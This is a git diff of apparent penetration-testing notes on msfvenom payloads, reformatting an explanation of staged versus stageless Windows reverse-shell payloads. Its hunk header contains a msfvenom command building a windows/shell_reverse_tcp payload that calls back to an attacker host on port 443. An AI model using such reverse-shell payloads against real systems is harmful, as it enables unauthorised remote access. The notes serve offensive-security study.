@@ -57,15 +57,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread(
 
 ### staged vs stageless
 ```
-windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell
+windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell (stageless)
 windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)
-
-Staged payloads begin the execution process with a small portion of the code that doesn't contain the full payload.Instead, it initiates the payload download from the attacking host after it begins execution. 
-
+```
+>Staged payloads begin the execution process with a small portion of the code that doesn't contain the full payload.Instead, it initiates the payload download from the attacking host after it begins execution. 
 The benefit of a staged payload is that the size of the file is smaller. This may help with upload limitations on a target host. We will not be working with staged payloads, since that would require us to work with Metasploit.Payloads separated by an underscore (_) are stageless payloads.
 
-Stageless payloads contain the full payload from MSFvenom and do not require any additional resources from the attacker after initial execution. These payloads are larger when they are produced but often don't require the use of Metasploit to obtain shell access.
-```
+>Stageless payloads contain the full payload from MSFvenom and do not require any additional resources from the attacker after initial execution. These payloads are larger when they are produced but often don't require the use of Metasploit to obtain shell access.
 
 ### NOP sled(verified less than 5 nops will reach page fault,as long as >=5, it is fine)
 ```
